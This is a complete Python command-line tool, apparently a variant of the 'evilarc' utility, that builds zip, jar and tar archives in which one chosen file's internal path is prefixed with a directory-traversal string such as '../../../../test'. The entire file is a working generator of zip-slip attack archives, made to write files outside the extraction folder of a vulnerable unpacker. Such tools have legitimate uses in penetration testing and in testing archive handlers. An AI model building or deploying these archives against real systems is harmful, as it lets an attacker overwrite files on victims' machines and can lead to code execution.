#!/usr/bin/env python3
"""
evilarc-multi.py
Creates an archive (zip/jar/tar/tar.gz/tgz/tar.bz2) that contains multiple
files, applying a custom directory‑traversal path to exactly one file.

Arguments
---------
  -p / --path     Custom traversal path to prepend (e.g. "../../../../test")
  -t / --target   File to which the traversal path is applied
  -f / --output   Output archive name
  files...        One or more files to include in the archive
"""

import argparse
import os
import sys
import tarfile
import zipfile


def build_archive(files, traversal_path, target, out_name):
    """
    Build the archive, inserting each file under its desired internal name.
    The file specified by *target* gets the traversal path prepended.
    """
    # Ensure a trailing slash/backslash on the traversal path
    if traversal_path and not traversal_path.endswith(('/', '\\')):
        traversal_path += '/'

    ext = os.path.splitext(out_name)[1].lower()
    wmode = 'a' if os.path.exists(out_name) else 'w'

    def internal_name(fname: str) -> str:
        """Return the archive name for *fname*."""
        if os.path.abspath(fname) == os.path.abspath(target):
            return traversal_path + os.path.basename(fname)
        return os.path.basename(fname)

    # ZIP / JAR
    if ext in {'.zip', '.jar'}:
        with zipfile.ZipFile(out_name, wmode) as zf:
            for f in files:
                zf.write(f, internal_name(f))
    # TAR and compressed variants
    elif ext in {'.tar', '.gz', '.tgz', '.bz2'}:
        mode = {
            '.tar': wmode,
            '.gz':  'w:gz',
            '.tgz': 'w:gz',
            '.bz2': 'w:bz2',
        }[ext]
        with tarfile.open(out_name, mode) as tf:
            for f in files:
                tf.add(f, internal_name(f))
    else:
        sys.exit(f"Unsupported archive extension: {ext}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Create an archive with a directory traversal on one file."
    )
    parser.add_argument(
        "-p", "--path", required=True,
        help='Traversal path to apply (e.g. "../../../../test")'
    )
    parser.add_argument(
        "-t", "--target", required=True,
        help="File that will receive the traversal path (must be among the input files)"
    )
    parser.add_argument(
        "-f", "--output", required=True,
        help="Output archive name (e.g. evil.zip)"
    )
    parser.add_argument(
        "files", nargs="+",
        help="List of files to include in the archive"
    )

    args = parser.parse_args()

    # Basic sanity checks
    for f in args.files:
        if not os.path.isfile(f):
            sys.exit(f"File not found: {f}")
    if args.target not in args.files:
        sys.exit("The file specified with --target must be in the input file list.")

    build_archive(args.files, args.path, args.target, args.output)
    print(f"Created {args.output} with traversal path applied to {args.target}")


if __name__ == "__main__":
    main()
